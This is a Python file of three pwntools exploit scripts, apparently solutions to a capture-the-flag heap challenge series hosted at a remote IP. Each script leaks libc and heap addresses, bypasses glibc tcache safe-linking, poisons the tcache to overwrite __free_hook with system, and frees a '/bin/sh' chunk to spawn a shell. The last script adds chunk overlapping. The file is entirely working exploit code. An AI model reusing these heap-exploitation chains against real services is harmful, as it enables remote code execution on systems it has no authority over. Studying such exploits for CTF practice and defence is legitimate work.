from pwn import *
import re

gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''

context.terminal = ['tmux', 'splitw', '-h']
# binaryname = "./spaghetti"
# p=process(binaryname)
p=remote("207.154.239.148", 1369)
# p=gdb.debug(binaryname, gdbscript=gs)
#gdb.attach(p)

def malloc(ind, size):
    global p
    r1 = p.sendlineafter(b">", b"1")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">", str(size).encode())
    #r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3#+r4

def free(ind):
    global p
    r1 = p.sendlineafter(b">", b"2")
    r2 = p.sendlineafter(b">", str(ind).encode())
    return r1+r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">", b"3")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", b"4")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.recvuntil(b"You are using")
    return r1+r2+r3

def readLeak(resp):
    rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
    paddedleak = rawleak.ljust(8, b'\x00')
    leak = u64(paddedleak)
    return leak

def decrypt(cipher):
    key=0
    for i in range(1,6):
        bits=64-12*i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain
#glibc 2.32 tcache addresses are stored as address ^ (chunk_address>>12)

malloc(0, 0x24)
malloc(1, 0x24)
malloc(2, 0x421)
malloc(3, 0x24)

free(2)

leak = u64(view(2).split(b'\n')[7].split(b" ")[1].ljust(8, b"\x00"))
free(0)
free(1)
edit(3, "/bin/sh") # jon snow
libc=ELF("./libc.so.6")
offset = 0x1ecbe0
base = leak - offset
libc.address = base
free_hook = libc.sym["__free_hook"]
log.info(hex(free_hook))
edit(1, p64(free_hook))
malloc(4, 0x24)
malloc(5, 0x24)
edit(5, p64(libc.sym["system"]))
free(3)

#Level 2 Script
from pwn import *
import re

gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''

context.terminal = ['tmux', 'splitw', '-h']
binaryname = "./encrypted"
# p=process(binaryname)
e = ELF("./libc.so.6")
p=remote("207.154.239.148", 1370)
# p=gdb.debug(binaryname, gdbscript=gs)
#gdb.attach(p)

def malloc(ind, size):
    global p
    r1 = p.sendlineafter(b">", b"1")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">", str(size).encode())
    #r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3#+r4

def free(ind):
    global p
    r1 = p.sendlineafter(b">", b"2")
    r2 = p.sendlineafter(b">", str(ind).encode())
    return r1+r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">", b"3")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", b"4")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.recvuntil(b"You are using")
    return r1+r2+r3

def read_leak(resp):
    rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
    paddedleak = rawleak.ljust(8, b'\x00')
    leak = u64(paddedleak)
    return leak

#glibc 2.32 tcache addresses are stored as address ^ (chunk_address>>12)
def encrypt(target, heapbase):
    return target ^ (heapbase >> 12)

malloc(0, 0x418)
malloc(1, 0x24) # jon
malloc(2, 0x24)
free(0)
free(1)
malloc(3, 0x428)
glibc_leak = read_leak(view(0))
heap_leak = read_leak(view(1))
forever_offset = 0x1e3ff0

log.info(f'Glibc Leak = {hex(glibc_leak)}')
log.info(f'Heap leak = {hex(heap_leak)}')

glibc_base = glibc_leak - forever_offset
e.address = glibc_base

free_hook = e.sym['__free_hook']
system_ = e.sym['system']

free(2)
edit(2, p64(free_hook ^ heap_leak))
malloc(3, 0x24)
malloc(4, 0x24) # FREE_HOOK
edit(4, p64(system_))
malloc(5, 0x24)
edit(5, b'/bin/sh')
free(5)

#Level 3 Script
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
#p = process("./free_a")
e = ELF("./libc.so.6")
p=remote("207.154.239.148", 1371)
def malloc(ind, size):
    global p
    r1 = p.sendlineafter(b">", b"1")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">", str(size).encode())
    #r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3#+r4

def free(ind):
    global p
    r1 = p.sendlineafter(b">", b"2")
    r2 = p.sendlineafter(b">", str(ind).encode())
    return r1+r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">", b"3")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", b"4")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.recvuntil(b"You are using")
    return r1+r2+r3

def readLeak(resp):
    rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
    paddedleak = rawleak.ljust(8, b'\x00')
    leak = u64(paddedleak)
    return leak

def decrypt(cipher):
    key=0
    for i in range(1,6):
        bits=64-12*i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

# encrypt a function pointer
def encrypt(v, key):
    #return p64(rol(v ^ key, 0x11, 64))
    return v ^ key


#################
## HEAP LEAK ####
#################

malloc(0, 0x18) #A
free(0) # A is now in tcache   A (bk tcache head) -> 0x0
malloc(0, 0x18)
heap_leak = readLeak(view(0))
log.info(f'Heap Leak = {hex(heap_leak)}')

##################
## GLIBC LEAK ####
##################

malloc(3, 0x418)#this chunk is too big for tcache and protected by jon from the top chunk (wilderness)
malloc(69, 0x18)# JON
free(3)
malloc(5, 0x428)
malloc(3, 0x418)
glibc_leak = readLeak(view(3))
forever_offset = 0x1e3ff0
glibc_base = glibc_leak - forever_offset
log.info(
f'''
Glibc Leak = {hex(glibc_leak)}
Forever Offset = {hex(forever_offset)}
Glibc Base = {hex(glibc_base)}
''')

e.address = glibc_base
free(5) # cleaned off the 0x428 chunk (index 5)


# TCACHE LIMIT IS 7

for i in range(8): # 0 --> 7
    malloc(i, 0x108)

malloc(15, 0x108)
malloc(16, 0x108)
malloc(17, 0x18) # WE NEED THE JON SNOW

for i in range(8): # 0 --> 7
    free(i)

free(16)
free(15) # MAKES THE GIANT CHUNK

malloc(17, 0x108) # FREE UP A SPACE IN TCACHE
free(16) # FREE THE BOTTOM CHUNK, WHICH HAS IT'S METADATA IN THE MIDDLE OF THE MERGED CHUNK

malloc(18, 0x300) # CHUNK OF FLESH, LITTLE DOES IT KNOW WE HAVE THIS POINTER IN THE MIDDLE OF IT

free_hook = e.sym['__free_hook']
system = e.sym['system']

edit(18, p64(0x0) * 67 + p64(0x111) + p64(encrypt(free_hook, heap_leak) + 1) + p64(0x0))
malloc(19, 0x108)
malloc(20, 0x108)

edit(20, p64(system))
malloc(21, 0x18)
edit(21, b'/bin/sh')
free(21)





